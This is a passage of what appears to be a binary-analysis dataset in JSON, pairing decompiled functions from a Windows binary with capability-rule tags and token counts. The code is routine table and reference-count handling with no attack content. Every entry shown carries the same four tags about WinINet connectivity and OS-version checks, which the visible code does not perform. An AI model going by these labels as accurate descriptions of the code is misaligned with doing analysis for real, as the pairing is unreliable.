        "decompiled_code": "\nint32_t __cdecl fcn.000634e0(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if (*0x800da9c4 == 0) {\n        *0x800da9e0 = *arg_8h;\n        *0x800da9e4 = arg_8h[1];\n        *0x800da9e8 = arg_8h[2];\n        *0x800da9ec = arg_8h[3];\n        iVar1 = fcn.00061ea0();\n        if (iVar1 == 0) {\n            *0x800da9c4 = 1;\n            iVar1 = fcn.00061b30();\n            if (iVar1 != 0) {\n                fcn.00063560();\n            }\n        }\n    }\n    else {\n        iVar1 = 0x21590006;\n    }\n    return iVar1;\n}\n",
        "token_count": 210
    },
    "00063560": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00063560(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800da9c4 != 0) {\n        for (var_4h = 0; var_4h < *0x800da9bc; var_4h = var_4h + 1) {\n        }\n        fcn.000357f0(*0x800da9b8);\n        fcn.00061b50();\n        fcn.00061ec0();\n        *0x800da9c4 = 0;\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "000635c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000635c0(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, uint *arg_18h)\n\n{\n    uint uVar1;\n    \n    if (arg_18h == NULL) {\n        uVar1 = 0x21590069;\n    }\n    else {\n        *arg_18h = 0;\n        if (arg_ch == 0) {\n            uVar1 = 0x21590066;\n        }\n        else if (arg_10h == 0) {\n            uVar1 = 0x21590067;\n        }\n        else if (arg_14h == 0) {\n            uVar1 = 0x21590068;\n        }\n        else if (*0x800da9c4 == 0) {\n            uVar1 = 0x21590001;\n        }\n        else if (*0x800da9bc == -1) {\n            uVar1 = 0x21590007;\n        }\n        else {\n            uVar1 = fcn.00061f40(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 278
    },
    "00063650": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00063650(uint arg_8h, uint arg_ch, int32_t arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    \n    if (arg_14h == NULL) {\n        uVar1 = 0x21590068;\n    }\n    else {\n        *arg_14h = 0;\n        if (arg_10h == 0) {\n            uVar1 = 0x21590067;\n        }\n        else if (*0x800da9c4 == 0) {\n            uVar1 = 0x21590001;\n        }\n        else if (*0x800da9bc == -1) {\n            uVar1 = 0x21590007;\n        }\n        else {\n            uVar1 = fcn.00061fc0(arg_8h, arg_ch, arg_10h, arg_14h);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 210
    },
    "000636c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000636c0(int32_t arg_8h, int32_t arg_ch, uint *arg_10h)\n\n{\n    bool bVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint arg_14h;\n    uint *arg_18h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0;\n    bVar1 = false;\n    var_4h = 0;\n    var_ch = 0;\n    var_18h = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_20h = 0;\n    var_10h = arg_10h;\n    if (arg_10h == NULL) {\n        return 0x21590067;\n    }\n    *arg_10h = 0;\n    if (arg_8h == 0) {\n        return 0x21590065;\n    }\n    if (arg_ch == 0) {\n        return 0x21590066;\n    }\n    if (*0x800da9c4 == 0) {\n        return 0x21590001;\n    }\n    var_1ch = fcn.00061d00(&var_ch, &var_18h);\n    if (var_1ch == 0) {\n        var_4h = 1;\n        var_1ch = 0x21590005;\n        for (var_8h = 0; var_8h < *0x800da9bc; var_8h = var_8h + 1) {\n            if ((*(*0x800da9b8 + 4 + var_8h * 8) != 0) && (*(*(*0x800da9b8 + 4 + var_8h * 8) + 8) == arg_8h)) {\n                if (*(*(*0x800da9b8 + 4 + var_8h * 8) + 0x78) != arg_ch) {\n                    fcn.00061d20(var_ch, var_18h);\n                    return 0x21590064;\n                }\n                *(*(*0x800da9b8 + 4 + var_8h * 8) + 0x88) = *(*(*0x800da9b8 + 4 + var_8h * 8) + 0x88) + 1;\n                var_1ch = 0;\n                *arg_10h = *(*0x800da9b8 + 4 + var_8h * 8);\n                break;\n            }\n        }\n        fcn.00061d20(var_ch, var_18h);\n        var_4h = 0;\n        if (var_1ch == 0) {\n            return 0;\n        }\n        if (*0x800da9bc == 0xff) {\n            return 0x21590007;\n        }\n        arg_18h = &var_10h;\n        arg_14h = 1;\n        uVar2 = fcn.00063250();\n        var_1ch = fcn.00062b00(arg_8h, 0, uVar2, arg_14h, arg_18h);\n        if (var_1ch != 0) {\n            return var_1ch;\n        }\n        var_10h[0xd] = *var_10h;\n        var_10h[0xf] = var_10h[6];\n        var_1ch = fcn.00046120(var_10h + 0xd, var_10h + 0xf, var_10h + 0xe);\n        if (var_1ch == 0) {\n            var_10h[0x1e] = arg_ch;\n            var_10h[0x1c] = 1;\n            uVar2 = fcn.00063250();\n            var_10h[0x20] = uVar2;\n            var_10h[0x1f] = arg_8h;\n            var_1ch = fcn.00061c80(var_10h + 0x1f, var_10h + 0x20, 0, var_10h + 0x21);\n            if (var_1ch == 0) {\n                var_14h = 1;\n                var_1ch = fcn.00061d00(&var_ch, &var_18h);\n                if (var_1ch == 0) {\n                    var_4h = 1;\n                    var_28h = var_10h[0x1f];\n                    var_24h = var_10h[0x20];\n                    var_1ch = fcn.00061c40(&var_28h, &var_24h, &var_20h);\n                    if (var_1ch == 0) {\n                        bVar1 = true;\n                        for (var_8h = 0; (var_8h < *0x800da9bc && (*(*0x800da9b8 + 4 + var_8h * 8) != 0));\n                            var_8h = var_8h + 1) {\n                        }\n                        if (*0x800da9bc <= var_8h) {\n                            iVar3 = fcn.00035720(0x800da9b8, *0x800da9bc << 3, *0x800da9bc * 8 + 8);\n                            if (iVar3 == -1) {\n                                var_1ch = 0x21590004;\n                                fcn.000631d0(var_10h);\n                                goto code_r0x00063a70;\n                            }\n                            var_8h = *0x800da9bc;\n                            *0x800da9bc = *0x800da9bc + 1;\n                        }\n                        var_1ch = fcn.00063160(var_10h, var_8h);\n                        if (var_1ch == 0) {\n                            fcn.00071080(*0x800da9b8 + 4 + var_8h * 8, var_10h);\n                            fcn.00071080(*0x800da9b8 + var_8h * 8, var_10h[0x1e]);\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x00063a70:\n    if (bVar1) {\n        fcn.00061c60(var_28h, var_24h, var_20h);\n    }\n    if (var_4h != 0) {\n        fcn.00061d20(var_ch, var_18h);\n    }\n    if (var_1ch == 0) {\n        fcn.00061ce0(var_10h[0x1f], var_10h[0x20], var_10h[0x21]);\n        var_10h[0x1f] = 0;\n        var_10h[0x20] = 0;\n        var_10h[0x21] = 0;\n        *arg_10h = var_10h;\n    }\n    else {\n        if (var_14h != 0) {\n            fcn.00061ce0(var_10h[0x1f], var_10h[0x20], var_10h[0x21]);\n        }\n        fcn.000630d0(&var_10h);\n    }\n    return var_1ch;\n}\n",
        "token_count": 1744
    },
    "00063b20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00063b20(int32_t *arg_8h)\n\n{\n    bool bVar1;\n    uint uVar2;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    bVar1 = false;\n    var_4h = 0;\n    var_10h = 0;\n    var_1ch = 0;\n    var_18h = 0;\n    var_34h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    var_ch = 0;\n    var_14h = *arg_8h;\n    if (*0x800da9c4 == 0) {\n        return 0x21590001;\n    }\n    if ((var_14h == 0) || ((*(var_14h + 0x70) != 0 && (*(var_14h + 0x70) != 1)))) {\n        return 0x21590065;\n    }\n    var_30h = *(var_14h + 8);\n    if (((var_30h == 0) || (*(var_14h + 0x14) == 0)) || (*(var_14h + 0x10) == 0)) {\n        return 0x21590065;\n    }\n    var_20h = fcn.00061ef0(var_14h, &var_24h, &var_ch);\n    if (var_20h != 0) {\n        return var_20h;\n    }\n    if (*(var_14h + 0x7c) == 0) {\n        uVar2 = fcn.00063250();\n        *(var_14h + 0x80) = uVar2;\n        *(var_14h + 0x7c) = *(var_14h + 8);\n        var_20h = fcn.00061c80(var_14h + 0x7c, var_14h + 0x80, 0, var_14h + 0x84);\n        if (var_20h != 0) goto code_r0x00063da5;\n    }\n    var_20h = fcn.00061d00(&var_10h, &var_1ch);\n    if (var_20h == 0) {\n        var_4h = 1;\n        var_34h = *(var_14h + 0x7c);\n        var_2ch = *(var_14h + 0x80);\n        var_20h = fcn.00061c40(&var_34h, &var_2ch, &var_28h);\n        if (var_20h == 0) {\n            bVar1 = true;\n            var_20h = fcn.00046120();\n            if (var_20h == 0) {\n                for (var_8h = 0; var_8h < *0x800da9bc; var_8h = var_8h + 1) {\n                    if (*(*0x800da9b8 + 4 + var_8h * 8) == var_14h) {\n                        *(*(*0x800da9b8 + 4 + var_8h * 8) + 0x88) = *(*(*0x800da9b8 + 4 + var_8h * 8) + 0x88) + -1;\n                        if (*(*(*0x800da9b8 + 4 + var_8h * 8) + 0x88) != 0) {\n                            var_20h = 0;\n                            goto code_r0x00063da5;\n                        }\n                        fcn.00071080(*0x800da9b8 + 4 + var_8h * 8, 0);\n                        fcn.00071080(*0x800da9b8 + var_8h * 8, 0);\n                        var_8h = 0xffffffff;\n                        break;\n                    }\n                }\n                if (var_8h == 0xffffffff) {\n                    fcn.000631d0(var_14h);\n                    var_18h = 1;\n                    var_20h = 0;\n                }\n                else {\n                    var_20h = 0x21590005;\n                }\n            }\n        }\n    }\ncode_r0x00063da5:\n    if (bVar1) {\n        fcn.00061c60(var_34h, var_2ch, var_28h);\n    }\n    if (var_4h != 0) {\n        fcn.00061d20(var_10h, var_1ch);\n    }\n    if ((var_20h == 0) && (var_18h != 0)) {\n        fcn.00061ce0(*(var_14h + 0x7c), *(var_14h + 0x80), *(var_14h + 0x84));\n        fcn.000630d0(arg_8h);\n    }\n    fcn.00061f20(var_24h, var_ch);\n    return var_20h;\n}\n",
        "token_count": 1245
    },
    "00063e20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00063e20(int32_t arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t *arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t var_25ch;\n    uint var_258h;\n    int32_t var_1bch;\n    \n    if (*0x800da9c4 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else if (arg_8h == 0) {\n        uVar1 = 0x21590065;\n    }\n    else if (arg_14h == NULL) {\n        uVar1 = 0x21590068;\n    }\n    else {\n        fcn.000610a0(&var_258h);\n        fcn.00061140(&var_258h, 0x20);\n        fcn.000611a0(&var_258h, 0);\n        fcn.00060ce0(&var_258h, arg_8h, arg_ch);\n        var_25ch = 0;\n        *arg_14h = 0;\n        while (((var_25ch < arg_ch &&\n                (((arg_10h == 0 || (*arg_14h < arg_10h)) && (iVar2 = fcn.000610e0(&var_258h),  iVar2 != 0)))) &&\n               ((*arg_14h = *arg_14h + 1,  var_1bch != 0x1be && (var_1bch != 0x1bf))))) {\n            iVar2 = fcn.000611d0(&var_258h);\n            var_25ch = iVar2 + var_25ch;\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 410
    },
    "00063f30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00063f30(uint *arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h[0x1c] == 0) {\n        var_8h = **arg_8h;\n    }\n    else {\n        var_8h = *arg_8h;\n    }\n    return var_8h;\n}\n",
        "token_count": 91
    },
    "00063f70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00063f70(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    if (*0x800da9c4 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.00062030(arg_8h, arg_ch, arg_10h, arg_14h);\n    }\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00063fa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00063fa0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    if (*0x800da9c4 == 0) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.000620c0(arg_8h, arg_ch, arg_10h);\n    }\n    return uVar1;\n}\n",
        "token_count": 101
    },
    "00064000": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00064000(uint arg_8h, uint arg_ch, int32_t *arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.000356f0(0x8c);\n    *arg_10h = iVar1;\n    if (*arg_10h == 0) {\n        iVar1 = 0x21590004;\n    }\n    else {\n        fcn.00078bfa(*arg_10h, 0, 0x8c);\n        iVar1 = fcn.000640e0(1, arg_8h, arg_ch, *arg_10h);\n        if (iVar1 == 0) {\n            *arg_14h = *(*arg_10h + 8);\n        }\n        else {\n            fcn.000357f0(*arg_10h);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 215
    },
    "00064080": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00064080(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    if ((arg_8h == NULL) || (*arg_8h == 0)) {\n        iVar1 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.000640e0(0, 0, 0, *arg_8h);\n        if (iVar1 == 0) {\n            fcn.000357f0(*arg_8h);\n            *arg_8h = 0;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 144
    },
    "000640e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0006414e)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.000640e0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uchar var_8h;\n    uchar var_7h;\n    int32_t var_6h;\n    \n    var_ch._0_2_ = 0;\n    var_ch._2_2_ = 0;\n    var_8h = 0;\n    var_7h = 0;\n    var_6h._0_2_ = 0;\n    if (arg_14h == 0) {\n        return 0x21590068;\n    }\n    if (arg_8h == 0) {\n        if (*(arg_14h + 0x78) == 0) {\n            return 0x21590068;\n        }\n        arg_ch = *(arg_14h + 8);\n    }\n    else {\n        if (arg_ch == 0) {\n            return 0x21590065;\n        }\n        if (arg_10h == 0) {\n            return 0x21590067;\n        }\n    }\n    iVar2 = fcn.00057cd0();\n    var_18h = fcn.000356f0(iVar2 * 0x18);\n    if (var_18h == 0) {\n        var_28h = 0x21590004;\n    }\n    else {\n        iVar2 = fcn.00057cd0();\n        var_14h = iVar2 * 6 + var_18h;\n        iVar2 = fcn.00057cd0();\n        *0x18 = iVar2 * 6 + var_18h;\n        iVar2 = fcn.00057cd0();\n        *0x18 = *0x18 + iVar2 * 6;\n        var_10h = 0;\n        while (uVar3 = fcn.00057cd0(),  var_10h < uVar3) {\n            var_28h = fcn.00057ce0(var_10h, var_10h * 6 + var_18h);\n            if ((var_28h != 0) || (var_28h = fcn.00057d00(var_10h, var_10h * 6 + var_14h),  var_28h != 0))\n            goto code_r0x000643a0;\n            var_10h = var_10h + 1;\n        }\n        if (arg_8h == 0) {\n            var_ch._0_2_ = *(arg_14h + 0x40);\n            var_ch._2_2_ = *(arg_14h + 0x40) >> 0x10;\n            uVar1 = *(arg_14h + 0x44);\n            var_8h = uVar1;\n            var_7h = uVar1 >> 8;\n            var_6h._0_2_ = uVar1 >> 0x10;\n        }\n        else {\n            var_1ch = *(var_18h + 2) + arg_ch * 8;\n            uVar1 = var_1ch[1];\n            var_ch._0_2_ = *var_1ch;\n            var_ch._2_2_ = *var_1ch >> 0x10;\n            var_8h = uVar1;\n            var_7h = uVar1 >> 8;\n            var_6h._0_2_ = uVar1 >> 0x10;\n            fcn.00078bfa(arg_14h, 0, 0x8c);\n            *(arg_14h + 0x70) = 0;\n            *(arg_14h + 0x78) = arg_10h;\n            *(arg_14h + 8) = arg_ch;\n            *(arg_14h + 0x40) = *var_1ch;\n            *(arg_14h + 0x44) = var_1ch[1];\n            var_6h._0_2_ = arg_10h >> 0x10;\n            var_ch._0_2_ = arg_10h;\n            var_ch._2_2_ = 8;\n            var_8h = 0;\n            var_7h = 0x8e;\n        }\n        var_10h = 0;\n        while (uVar3 = fcn.00057cd0(),  var_10h < uVar3) {\n            var_1ch = *(var_18h + 2 + var_10h * 6) + arg_ch * 8;\n            *(stack0xfffffff8 + 4 + var_10h * 0xc) = CONCAT22(var_ch._2_2_, var_ch);\n            *(stack0xfffffff8 + 8 + var_10h * 0xc) = CONCAT22(var_6h, CONCAT11(var_7h, var_8h));\n            *(stack0xfffffff8 + var_10h * 0xc) = var_1ch;\n            var_10h = var_10h + 1;\n        }\n        fcn.00061d00(&var_24h, &var_20h);\n        var_10h = 0;\n        while (uVar3 = fcn.00057cd0(),  var_10h < uVar3) {\n            fcn.00071080(*(stack0xfffffff8 + var_10h * 0xc), *(stack0xfffffff8 + 4 + var_10h * 0xc));\n            fcn.00071080(*(stack0xfffffff8 + var_10h * 0xc) + 4, *(stack0xfffffff8 + 8 + var_10h * 0xc));\n            var_10h = var_10h + 1;\n        }\n        fcn.00061d20(var_24h, var_20h);\n        var_28h = 0;\ncode_r0x000643a0:\n        fcn.000357f0(var_18h);\n    }\n    return var_28h;\n}\n",
        "token_count": 1466
    },
    "000643c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0006441d\n\nuint __cdecl fcn.000643c0(uint16_t *arg_8h)\n\n{\n    uint uVar1;\n    uint var_54h;\n    uint var_ch;\n    uint var_8h;\n    \n    if (arg_8h == NULL) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        if (*arg_8h < 0xb2) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 152
    },
    "00064ac0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00064b1d\n\nuint __cdecl fcn.00064ac0(uint16_t *arg_8h)\n\n{\n    uint uVar1;\n    uint var_54h;\n    uint var_ch;\n    uint var_8h;\n    \n    if (arg_8h == NULL) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        if (*arg_8h < 0xb2) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 153
    },
    "00065320": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x00065389\n\nuint __cdecl fcn.00065320(uint16_t *arg_8h)\n\n{\n    uint uVar1;\n    uint var_8ch;\n    uint var_ch;\n    uint var_8h;\n    \n    if (arg_8h == NULL) {\n        uVar1 = 0xffffffff;\n    }\n    else {\n        if (*arg_8h < 0xb2) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 150
    },
    "00065aa0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00065aa0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint16_t *puVar1;\n    int32_t iVar2;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    while( true ) {\n        if (arg_ch <= var_8h) {\n            return (*(arg_8h + -8 + arg_ch * 8) & 7) == 6;\n        }\n        puVar1 = arg_8h + var_8h * 8;\n        if ((*puVar1 & 7) == 5) {\n            iVar2 = var_8h + 1;\n            if ((*puVar1 & 0xf0) == 0) {\n                if (arg_ch <= iVar2 + *(puVar1 + 2)) {\n                    return false;\n                }\n            }\n            else if ((arg_ch <= *(puVar1 + 1) + iVar2) || (arg_ch <= *(puVar1 + 3) + iVar2)) {\n                return false;\n            }\n        }\n        if ((((*puVar1 & 7) == 2) || (((*puVar1 & 7) == 0 && ((*puVar1 & 0xe0) == 0x60)))) &&\n           ((0xf < *(puVar1 + 2) || (*(puVar1 + 2) < 0)))) break;\n        if ((*puVar1 == 0x34) && (*(puVar1 + 2) == 0)) {\n            return false;\n        }\n        var_8h = var_8h + 1;\n    }\n    return false;\n}\n",
        "token_count": 378
    },
    "00065bb0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00065e78)\n// WARNING: Removing unreachable block (ram,0x00065e6d)\n// WARNING: Removing unreachable block (ram,0x00065e8f)\n// WARNING: Removing unreachable block (ram,0x00065dd4)\n// WARNING: Removing unreachable block (ram,0x00065e04)\n// WARNING: Removing unreachable block (ram,0x00065e0b)\n// WARNING: Removing unreachable block (ram,0x00065e14)\n// WARNING: Removing unreachable block (ram,0x00065e27)\n// WARNING: Removing unreachable block (ram,0x00065e30)\n// WARNING: Removing unreachable block (ram,0x00065e40)\n\nint32_t __cdecl\nfcn.00065bb0(int32_t *arg_8h, char *arg_ch, int32_t arg_10h, uint noname_3, int32_t arg_18h, uint noname_5, \n            uint32_t arg_20h)\n\n{\n    int16_t iVar1;\n    uint arg_ch_00;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_38h;\n    int16_t *var_34h;\n    int16_t *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    arg_8h_00 = fcn.000356f0(0x140);\n    if (arg_8h_00 == 0) {\n        var_14h = 0x21590004;\n    }\n    else {\n        fcn.00078bfa(arg_8h_00, 0, 0x140);\n        if ((arg_ch == NULL) || (*arg_ch == '\\0')) {\n            var_30h = 0x80055694;\n            var_34h = arg_8h_00 + 0x1e;\n            do {\n                iVar1 = *var_30h;\n                *var_34h = iVar1;\n                var_30h = var_30h + 1;\n                var_34h = var_34h + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            iVar3 = fcn.000789c6(arg_8h_00 + 0x1e, 0x40, 0x8005467c, arg_ch);\n            if (iVar3 < 0) {\n                *(arg_8h_00 + 0x9c) = 0;\n            }\n        }\n        if (arg_10h == 0) {\n            fcn.000784d0(arg_8h_00 + 0xe4, arg_8h_00 + 0x124);\n            *(arg_8h_00 + 0x128) = 0xffffffff;\n        }\n        else {\n            var_14h = fcn.00078390(arg_10h, (arg_20h & 1) != 0, arg_8h_00 + 0xe4, arg_8h_00 + 0x124);\n            if (var_14h != 0) goto code_r0x00065f1a;\n            fcn.000349b0(arg_8h_00 + 0x18);\n        }\n        iVar3 = fcn.00078810(arg_8h_00 + 0x1e, arg_8h_00 + 0xe4, *(arg_8h_00 + 0x124), arg_8h_00 + 0xc, arg_8h_00 + 0x10\n                            );\n        if (iVar3 == 0) {\n            if (arg_18h != 0) {\n                var_14h = fcn.00078390(arg_18h, (arg_20h & 2) != 0, arg_8h_00 + 0x9e, arg_8h_00 + 0xe0);\n                if (var_14h != 0) goto code_r0x00065f1a;\n                iVar3 = fcn.00078760(arg_8h_00 + 0x1e, *(arg_8h_00 + 4), arg_8h_00 + 8);\n                if (iVar3 != 0) {\n                    var_14h = fcn.00078a2c(iVar3);\n                    goto code_r0x00065f1a;\n                }\n                arg_ch_00 = *(*(arg_8h_00 + 8) + 4);\n                iVar3 = (**0x80051234)(3, arg_ch_00, 0, 0, 0, 0, 1, 0, 0);\n                if (iVar3 == 0) {\n                    var_14h = 0x21590004;\n                    goto code_r0x00065f1a;\n                }\n                iVar2 = *(iVar3 + 0x60);\n                *(iVar2 + -8) = 0;\n                *(iVar2 + -4) = 0;\n                *(iVar2 + -0x21) = 0;\n                iVar2 = *(iVar3 + 0x60);\n                *(iVar2 + -0x24) = 0xf;\n                *(iVar2 + -0x23) = 1;\n                *(iVar2 + -0x10) = arg_ch_00;\n                *(iVar2 + -0xc) = *(arg_8h_00 + 8);\n                *(iVar2 + -0x20) = *(arg_8h_00 + 0xc);\n                uVar4 = 0x65ef4;\n                iVar3 = fcn.000785d0(iVar3, arg_ch_00, &fcn.00065bb0::var_8h, 0xffffffff);\n                if (iVar3 != 0) {\n                    var_14h = fcn.00078a2c(uVar4);\n                    goto code_r0x00065f1a;\n                }\n            }\n            *arg_8h = arg_8h_00;\n            var_14h = 0;\n        }\n        else {\n            var_14h = fcn.00078a2c(iVar3);\n        }\n    }\ncode_r0x00065f1a:\n    if ((var_14h != 0) && (arg_8h_00 != 0)) {\n        if (*(arg_8h_00 + 